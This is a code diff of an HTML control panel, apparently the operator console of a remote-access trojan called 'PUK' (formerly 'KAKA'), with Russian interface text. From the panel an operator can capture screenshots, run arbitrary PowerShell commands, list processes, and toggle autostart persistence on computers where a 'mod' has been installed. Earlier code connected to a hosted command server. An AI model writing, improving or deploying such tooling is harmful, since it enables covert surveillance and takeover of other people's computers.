@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>KAKA Remote Control</title>
+    <title>PUK Remote Control</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <style>
         body { font-family: Arial; background: #1a1a1a; color: #fff; padding: 20px; }
         .container { max-width: 1200px; margin: 0 auto; }
         h1 { color: #00ff00; }
-        .computers { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+        .computers { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
         .card {
             background: #2a2a2a;
             border: 1px solid #444;
             border-radius: 10px;
             padding: 15px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
         }
         .card h3 { margin-top: 0; color: #00ff00; }
         .status-online { color: #00ff00; font-weight: bold; }
@@ -23,15 +23,18 @@
             background: #333;
             color: #fff;
             border: 2px solid #00ff00;
-            padding: 10px 15px;
+            padding: 8px 12px;
             margin: 5px;
             border-radius: 5px;
             cursor: pointer;
+            font-size: 12px;
         }
         .btn:hover { background: #444; }
+        .btn-danger { border-color: #ff4444; }
+        .btn-danger:hover { background: #662222; }
         .cmd-input {
             padding: 8px;
-            width: 200px;
+            width: 180px;
             margin: 5px;
             background: #333;
             color: #fff;
@@ -46,95 +49,139 @@
             max-height: 200px;
             overflow-y: auto;
             margin-top: 10px;
-            white-space: pre-wrap;
+            font-size: 11px;
         }
-        .screenshot-img {
-            max-width: 100%;
-            max-height: 300px;
-            margin-top: 10px;
-            border: 2px solid #00ff00;
+        .log-entry {
+            border-bottom: 1px solid #333;
+            padding: 5px 0;
+            margin: 0;
         }
+        .log-time { color: #888; }
+        .log-command { color: #0f0; }
+        .log-result { color: #fff; white-space: pre-wrap; word-break: break-all; }
+        .loading { opacity: 0.5; pointer-events: none; }
     </style>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
 </head>
 <body>
     <div class="container">
-        <h1>🎮 KAKA Remote Control</h1>
+        <h1>🎮 PUK Remote Control</h1>
         <p>Управление удаленными компьютерами</p>
 
-        <div class="computers" id="computers"></div>
+        <div class="computers" id="computers">
+            {% for computer in computers %}
+            <div class="card" data-id="{{ computer[0] }}">
+                <h3>{{ computer[1] }}</h3>
+                <p>ID: {{ computer[0] }}</p>
+                <p>Последний раз: {{ computer[2] }}</p>
+                <p>Статус: <span class="status-{{ computer[3] }}">{{ computer[3] }}</span></p>
+
+                <div class="commands">
+                    <button class="btn" onclick="sendCmd('{{ computer[0] }}', 'scrin')">📸 Скриншот</button>
+                    <button class="btn" onclick="sendCmd('{{ computer[0] }}', 'status')">📊 Статус</button>
+                    <button class="btn" onclick="sendCmd('{{ computer[0] }}', 'puk! Get-Process | Select-Object -First 10')">⚡ Процессы</button>
+                    <button class="btn" onclick="sendCmd('{{ computer[0] }}', 'autos')">🔌 Автозапуск</button>
+                    <button class="btn" onclick="sendCmd('{{ computer[0] }}', 'autodel')">❌ Убрать автозапуск</button>
+                </div>
+
+                <div>
+                    <input type="text" class="cmd-input" id="cmd-{{ computer[0] }}" placeholder="puk! команда">
+                    <button class="btn" onclick="sendCustom('{{ computer[0] }}')">→ Отправить</button>
+                </div>
+
+                <div class="log" id="log-{{ computer[0] }}">
+                    <div class="log-entry">✨ Готов к работе</div>
+                </div>
+            </div>
+            {% else %}
+            <div class="card">
+                <h3>Нет подключенных компьютеров</h3>
+                <p>Установите мод на компьютер и он появится здесь</p>
+            </div>
+            {% endfor %}
+        </div>
     </div>
 
     <script>
-        const socket = io('wss://puk-control.onrender.com');
-        let computers = {};
+        // Подключаем Socket.IO
+        const socket = io();
 
-        socket.on('connect', () => {
-            console.log('Connected to server');
-        });
-
-        socket.on('command_done', (data) => {
-            const log = document.getElementById(`log-${data.computer_id}`);
-            if (log) {
-                if (data.result.startsWith('data:image')) {
-                    // Это скриншот
-                    log.innerHTML = `<img src="${data.result}" class="screenshot-img">`;
-                } else {
-                    // Текстовый результат
-                    log.innerText = data.result;
-                }
+        // Обработка результатов команд
+        socket.on('command_done', function(data) {
+            const computerId = data.computer_id;
+            const command = data.command;
+            const result = data.result;
+            
+            const logDiv = document.getElementById(`log-${computerId}`);
+            const time = new Date().toLocaleTimeString();
+            
+            // Форматируем результат (если это скриншот - показываем превью)
+            let displayResult = result;
+            if (command === 'scrin' && result.startsWith('data:image')) {
+                displayResult = `<img src="${result}" style="max-width: 100%; border-radius: 5px; margin-top: 5px;">`;
+            } else {
+                displayResult = `<pre style="margin: 5px 0; white-space: pre-wrap;">${escapeHtml(result)}</pre>`;
+            }
+            
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-command">${escapeHtml(command)}</span><br><span class="log-result">${displayResult}</span>`;
+            
+            logDiv.insertBefore(entry, logDiv.firstChild);
+            
+            // Ограничиваем историю 50 сообщениями
+            while (logDiv.children.length > 50) {
+                logDiv.removeChild(logDiv.lastChild);
             }
         });
 
-        function sendCommand(computerId, command) {
-            socket.emit('send_command', {
-                computer_id: computerId,
-                command: command
-            });
-            
-            const log = document.getElementById(`log-${computerId}`);
-            if (log) {
-                log.innerText = `⏳ Отправлена команда: ${command}`;
+        // Функция для экранирования HTML
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Отправка команды
+        async function sendCmd(computerId, cmd) {
+            const formData = new FormData();
+            formData.append('computer_id', computerId);
+            formData.append('command', cmd);
+
+            const logDiv = document.getElementById(`log-${computerId}`);
+            const time = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-command">📤 ${escapeHtml(cmd)}</span><br><span class="log-result">⏳ Отправлено...</span>`;
+            logDiv.insertBefore(entry, logDiv.firstChild);
+
+            try {
+                const response = await fetch('/api/send_command', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                
+                if (result.status !== 'queued') {
+                    entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-command">❌ ${escapeHtml(cmd)}</span><br><span class="log-result">Ошибка: ${result.message}</span>`;
+                }
+            } catch (error) {
+                entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-command">❌ ${escapeHtml(cmd)}</span><br><span class="log-result">Ошибка сети: ${error}</span>`;
             }
         }
 
         function sendCustom(computerId) {
             const cmd = document.getElementById(`cmd-${computerId}`).value;
-            if (cmd) sendCommand(computerId, cmd);
+            if (cmd) {
+                sendCmd(computerId, cmd);
+                document.getElementById(`cmd-${computerId}`).value = '';
+            }
         }
 
-        // Обновление списка компьютеров
-        function updateComputers() {
-            fetch('/api/computers')
-                .then(res => res.json())
-                .then(data => {
-                    const container = document.getElementById('computers');
-                    container.innerHTML = '';
-                    
-                    data.forEach(comp => {
-                        const card = document.createElement('div');
-                        card.className = 'card';
-                        card.innerHTML = `
-                            <h3>${comp.name}</h3>
-                            <p>ID: ${comp.id}</p>
-                            <p>Статус: <span class="status-${comp.status}">${comp.status}</span></p>
-                            <div>
-                                <button class="btn" onclick="sendCommand('${comp.id}', 'scrin')">📸 Скриншот</button>
-                                <button class="btn" onclick="sendCommand('${comp.id}', 'status')">📊 Инфо</button>
-                            </div>
-                            <div>
-                                <input type="text" class="cmd-input" id="cmd-${comp.id}" placeholder="puk! команда">
-                                <button class="btn" onclick="sendCustom('${comp.id}')">→</button>
-                            </div>
-                            <div class="log" id="log-${comp.id}"></div>
-                        `;
-                        container.appendChild(card);
-                    });
-                });
-        }
-
-        // Обновляем список каждые 5 секунд
-        setInterval(updateComputers, 5000);
-        updateComputers();
+        // Автообновление списка компьютеров каждые 10 секунд
+        setInterval(() => {
+            location.reload();
+        }, 10000);
     </script>
 </body>
 </html>
